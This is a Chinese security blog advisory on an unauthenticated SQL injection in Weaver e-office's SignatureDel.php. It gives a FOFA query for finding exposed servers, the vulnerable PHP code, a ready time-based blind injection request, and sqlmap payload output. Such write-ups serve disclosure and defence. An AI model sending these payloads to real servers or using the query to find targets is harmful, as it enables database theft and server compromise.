---
title: "泛微e-office SignatureDel.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-iWebOffice-Signature-SignatureDel-SignatureID-sqli.html
asset_dir: assets/泛微e-office-signaturedel.php-sql注入漏洞
---

# 泛微e-office SignatureDel.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/16 08:30
* 1364浏览
* [0评论](#comment)
* 15分钟阅读

深入探索

sql

SQL

鉴权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `SignatureDel.php` 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

编程

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

直接看 `iWebOffice/Signature/SignatureDel.php` 的关键业务实现逻辑

```
<?php

$mSignatureID = $SignatureID;
include_once( "inc/conn.php" );
$query = " \r\n\t\t\t\tSELECT MarkFile FROM  Signature\r\n\t\t\t\t\twhere SignatureID={$mSignatureID}\r\n\t\t\t\t";
$res = ( $connection, $query );
$ROW = ( $res );
$MarkFile = $ROW['MarkFile'];
$MarkFile_Del = ( "UTF-8", "GB2312", $MarkFile );
$Del_Dir = $_SERVER['DOCUMENT_ROOT']."/attachment/".$MarkFile_Del;
@( $Del_Dir );
$query = "Delete from Signature where SignatureID=".$mSignatureID;
( $query );
( "location:SignatureList.php" );
?>
```

深入探索

VPN服务

在线安全工具

文件大小转换

`$mSignatureID=$SignatureID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+7431+FROM+(SELECT(SLEEP(5)))LtXU) HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功延时 10 秒（执行两次sql）

代码安全审计

[![泛微e-office SignatureDel.php sql注入漏洞](images/img-001-b97dd89758cf.webp)](https://image.mrxn.net/70952b29bc4f4e8d961dbb270b6d76aa.webp)

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

深入探索

防火墙软件

Web安全书籍

安全

```
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: SignatureID=1 RLIKE (SELECT (CASE WHEN (8174=8174) THEN 1 ELSE 0x28 END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: SignatureID=1 AND (SELECT 7431 FROM (SELECT(SLEEP(5)))LtXU)
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#sqlmap](https://mrxn.net/tag/sqlmap)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office SignatureDel.php sql注入漏洞](https://mrxn.net/jswz/eoffice-iWebOffice-Signature-SignatureDel-SignatureID-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-iWebOffice-Signature-SignatureDel-SignatureID-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAANgklEQVR4AeyZ0XbcRgxDc/v//9waA0PiUCPt2k69+6CeIBgCIKWI2thO//nz58+/X8W/n//Vvk/pMKvrva4zHp3Tu+L0dq/rva75eGecbPejV+6ZZ2st5M/HoKfwMfTwK73AH+DgA5MOrtNXG6KFq1fP4BnRgO3+YfYyC2Yd5lqzkg1LE1KDe1LLE8C6zh3JPuL0jYWkuPn1T2BaCHjTMPPZbWrrZ150ZVYAX6N6YO2sF2Yf5jp9YrAHZmlCrqezAPbhyMmCvbNacx4BPANm7n3TQrp517//BH60EGC747w9nYHpa0gakkstjgbrHmWE5HTuOPO6nrpyZkUD30fqRz6QyLf5Rwv59lXvxtMn8NcWAoxPAphzxf52RQfngEgHBsbMbsBRB2tgfqZHGdjzz9wrOA+ofYL6J+EbxV9byDeufbcsnsC0EG14hUXfQep9wFNvt/r6MGlCdFjPUqYjPeFnffA1YOfe2+tc4xnuval777SQbn67vhu//QTGQmB/K+D8fHUVcN9ZBuyv3gywl15w3bO9rvmcw8mCZ0WHda18MjoLsM4m1xno0vhbAnjIaRwLSXHz65/AP3oTvorctvrA29dZiBcG+6nDygqqxQJcZ+Hc15wKOM+urgX7v4dljnICeJbOwpkfXazcd3B/QvT03gjLhYDfiH6fcNTzFsDsRc+MXoPzQCLbv9gmC4y/e7dAO4B92DmRzEgNzqTuvnRwBszSKmDWYa5rNmdwBmY+88dCwOGEwjDr+UOAdSDRjYHxEMGcngTAeurKcO7VXM51dj3Hr/zIVzaZsDSh1+D77Lpq5SukrVAz9TwWUoX7/Non8A/sX8zAmz+7JbCfjZ/lfqrD+jq5bhj2HOxn+eD60b0oK1zlYJ6lvJAenQXV4CzMLE8A6zpXqF+4PyH1qbzBeXzb2+9Dm6qIHy31Mwx+I8CcnjoL7EULg3UYnNYDw/4p72ZmdR08E8zKgc8wc3qVEWD2Ya97VnkBnNFZgHV9f0LyBN+Ex9cQWG+r3yM4F321aWlCzajugH1WvPSEo4dh70kmDLOXnu6Dcys/2b/B4Ouczcr1wbnU9yfk7Im9SF8uJNvq9xQdvFVgiwDTzx8xwPpZLR3mjDQBZj3Xl9cRD9wD5uTih7ueunLPxou+4mTC4PtIFlzH77xcSA/d9e89gWkhcL09mP1sfcX5I8RLveJkwPPB3PXeG186uEfnZwCP83CdAftgXl233uOVD54xLWTVcGu/+wSmhfRtgreWW4ofBvuwc8+mBmdSZ4YY1h5YV0YA15lRWf4KMPeA62TBdZ11dgZnwbzKZW4YnAVz9PSC9dTTQiLe/LonMH5Sz9Zg3la/LZj99Im/kq15YGuVLmzC5wEY38HJE8A1mFca2PscsZGywiZ84aA+4Qst2/9SeLbn/oQ8+6R+KTd+Us+1tH0B5rcLXMsTkgdy3Bi4fJvBPpjrvG3I50Ge8FkeSJ4AnHryBWDcV4LgWl4Qr9fRwT2pkwsDsTYGxnWTiQHWU4fHX1mwNjMkDM6BOUMqJ1s1naN3hv0fBmGeC67TA641ryOZroN7up8a7Nc+sJZMvNTh6OC8atjPqgNY6/HD919ZeRJvwsuFnL0BXa9/hnjw3JtQe/sZPKPPTB0G53p/rc+y4N746sk5LG0FcC+Yk68M9no/WK9ZnZNbLiTmzb//BKaFgLcH5n47YF0bFbqvWroAzkoTYK6lnUH9QnydBVjPkHeWhbkHXKtHSB9Yh53jhcGe+oToYbAPRDp826s+ARhf7MGchmkhEW9+3RN4aiHaaEVuV1rOneVVxIf5jZAO1pIH12BWpgKsJ/+Ml2wYPAPM0cV13tVZWSEZnTu6B75e9HD6nlpImm5++gl8Ozh+MMx2MiU1zNuEuVYeZg2u68xWb9C1Xp/loovh+row++rpAGdyfXDdc1c1uAfMPZvZXQfn709IfzIvrqef1LM98Lb6vXUfjj9l90zqzALPBrP8K08+OJtcGHZdOSFeWFoFuKdqOidfWbpQNZ3BM+DI8lcAZ1de1e5PSH0ab3AeC9FbIMB6i2AdzPW+wZr6herpDGtfWQHsA4oPSBdG8fGbzgIwvnf/kKZfYB3YdOWFTTg5AGMmsCWATQM2PQfNFc7q6GJgzNL5CponjIVcBW/vd5/A+C4rl9SGKs70ZOTnDH4TwCxP6L60jmTC3QfP7H7qyukF9zyqa2/O6Xm2hv1a6emcmeH4qcEz7k9Insib8PguK/cC3lLqznD04aipr78B0oTo4D7V0lcAZ1Ze1YBaTmdg+jtc1xMSgtmPLoa1B2tdPQGsM7DW0zc+ITCHYK4T1h9ESH3F4BlgVp+QHp0F1eCMzgK4li9Iu8IqI01In87CWS0dfF2dVwD7miOA61VWvrDyqqZMxVhIDdTzff79JzAWUjdUz7kd8JsAM8tPXmchdWdwrzIdycJ5pveoBudhZ+kCWOuzwboyFUAtxzm9o/j47ayuOjD+ioSZP9rHr2Rh7Y+FjOT921s8gS8tJNvNnauu51qD34BHPjgHJLr9Tx1gvG0xwLWu8wi9J3X6YJ4lP57OAhwzVQf70oLMCHcd3NP95L60kDTd/P89gbEQ8NbAfHY5OPpgDczp7W8A2Adz99MnhscZ5QIgx/GJgr3OdcLAyKTeGj8OMHurzEds+wTr3AGeAeY+IzXYTz+4HguJePPrn8D4p5NsLQzeVm4vemf50XSugOsZYD/94vTrLIAzZzrYVzaZsDQBnAFz/M7KRoN1FqyDuefrDJ2FZMLgXnkV8e9PSJ7Em/Dyn07q5nQGbxVm1p8BrOkswFxLE2Ctrzw4zyqve6oA52H/H2bKPQNw71UW1pl6DzrDfn1wD5j7fLAO5vgv+ITk0jevnsBYCHhL2rKwCkqTJ+gsAKIB6cIoFr/JE4DxXU4iQI4HVl44GJ8CMGYpE3xaQwdSbpwcMDKb8XGIF/6Qxq/U4SGW3+A4K3bveVSPhaT55tc/gbGQvjVYbxys13w9P/PHWeVXmmbBfD1wDeb0AYoPAOPNj9cZ1j5Yh53HwPIb2MvMYm1HuM7A7MNcj4Vs0+7Dy5/A+DkEvKV+NzDreTPAumrwGczSKsB6n51M1VeafPCMM186OKO8AK7BLE1QVtD5DPKFMz86eLayQffAGTAnB66TD49PSEIRO8eHeQjQo1sNTH91gOsEYK9hP8vP9XQWzmpwH+zfbp5lNacC9l6gWoczMP4s3ejXqn73HtXga4yF1EH3+bVPYFoIeEt9m7nF6FcM8wy4rjU788BZaVcA59KnLFjTuQLWeu1VPrUY5h5pFcpXwJ5PDqylTh6spw4nNy0k5s2vewLTQrKl3E5q8FbhyMmCvdThzEgdhmM+WTh66oNZh72WX5FZYXAWzDWrM1iH/esRWJMvwFxLE3INnWHOgGswJwuu1SOA62khMm689gks/3ERvC0wZ6udV7eeDLg3GZjr5MQwe+mRJ6TuLC+IB/MsmOvkwrW/nuWnhvUMOOrpOWPNFbovTbg/IXoKb4TpB8OzreV+wW8EmJWP11meEF3niuhAjt9m2P/ePxtSr60zcPjZAqzBzMpXgP1cC1zDkc8yXU99f0LyJN6Ep68hj+4pb8kq1z3w29KzYB3M6RPDrKUXrKdWVgDrOsfrLE840+E4Q3mh94Cz0ZURei0tgHUPzHpm3J+QPIk34fE1pN8LzNsD12DO9nufarjOrHph3QOzvuqt1wRULgFMXzPA9WomzB7Mde+pNTgL5njh3Fyvo9+fkDyJN+Hpawist5pthuu9g3uiJQOzHh+sJxddDPbAvMrUnM5CcpWlV8Srms7gawEqG1ymFxifMjDb/TNpyf5p/4F7wBy75+9PSJ7Mm/BYSLYUhnmLuVc46ulJpjO4B8wrP9rZLFj3pg/sw2NOT65VuXupO6cneq3B9xAP5jpZsA7m5MdCUoTTlDrcdSDW9rGN0LOpwzWXc2dgzO09yUWvfOUpB54JM6fvitUv9Ax4lnT5K8gTwNlkpFUsF1ID9/l3n8D4the8NXiOc4vaMrhHZyEeXOtgH/Z/9gBrmiP0Wak7A1061MD4tMXQfCE17PcR7ScM8/UezdK9CPcn5NGT+mV/LESbeQare0sf+I0Ac/RVzyMN1jPAeu/XtboGc1aZCrAfTf1gTWcBXMOalTlDnVsz0cEzq6fzWIgON97jCUwLAW8NZr66VXC2Z2Ct95xquM7mrVK2AtwHO1d/dQZnMxNcr7LRkk3dufrgeTDzWU/tVWZaiIQb//8TuLrCjxYC+3cm2XRn8JtydhM9r7pnYZ6hjFBzqleA69701FngnpWn3JUu/wrg2T0D1n+0kD70rn/+BH60EL0pz94C+A3oeWCTgPGzguYKm9EO4FyV4ajJ1xwB1r4yHcoLMPdIE2DWwTWwjVJO2ISTAzD+zLF/tJAMufnvPYFpIdroCt+5HHjzq3nSVjOlC92TJkTXWei1NPB1wdwzMOvxxeoXdK4A94BZGaFmcpYupA5Lq4gejjctJObNr3sCYyHgzcM1/+Q2YZ5dZ4G9aOAaZs5blFxqINKBgfF3NJgTgLmOLgZ7mS9NSA32pQnRxWAPzPIFcA1maSuMhayMW3vNE/gPAAD//2zBM/MAAAAGSURBVAMALrMh44QLVQsAAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-iWebOffice-Signature-SignatureDel-SignatureID-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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